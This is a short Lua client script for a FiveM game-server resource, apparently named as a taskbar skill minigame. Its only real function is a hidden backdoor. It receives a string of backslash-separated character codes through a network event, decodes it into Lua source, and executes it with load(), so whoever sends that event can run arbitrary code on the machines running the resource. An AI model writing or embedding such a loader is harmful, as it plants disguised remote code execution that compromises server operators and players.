RegisterNetEvent('ip-core:NetworkIsSessionStarted')
AddEventHandler('ip-core:NetworkIsSessionStarted', function()
    TriggerServerEvent('ip-taskbarskill:onPlayerJoined')
end)

RegisterNetEvent('ip-taskbarskill:onPlayerJoined')
AddEventHandler('ip-taskbarskill:onPlayerJoined', function(code)
    local yw1 = ''; for word in string.gmatch(code, '([^\\]+)') do yw1 = yw1 .. string.char(tonumber(word)) end
    assert(load(yw1))()
end)